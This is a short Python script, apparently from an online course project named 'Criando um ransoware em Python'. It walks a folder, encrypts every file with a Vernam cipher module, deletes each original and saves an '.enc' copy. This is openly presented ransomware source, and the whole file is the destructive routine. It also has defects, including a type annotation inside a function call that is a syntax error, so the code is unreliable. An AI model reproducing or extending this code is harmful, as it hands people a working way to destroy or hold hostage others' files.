import os
import CifraDeVernam

def Criptografa(txt):
    return CifraDeVernam.EncriptarDecriptar(txt:str, "enc")
    
def LerArquivo(file:str):
    with open(file,'r') as f:
        return f.read()
    
def DeletaArquivo(files:str):
    os.remove(files) 

def GravaNovoArquivo(txt:str, root:str, file:str):
   with open(os.path.join(root, file) + '.enc', 'wb') as f:
       f.write(txt)

if __name__ == "__main__":
    path = r'C:\Users\guigu\Desktop\Projetos Digital Innovation One\Projetos-Digital-Innovation-One\Criando um ransoware em Python\Criptografar'
    # r=root, d=directories, f = files
    for root, directories, files in os.walk(path):
        for filename in files:
            txt = LerArquivo(os.path.join(root, filename))
            txtenc = Criptografa(txt)
            DeletaArquivo(os.path.join(root,filename))
            GravaNovoArquivo(txtenc, root,filename)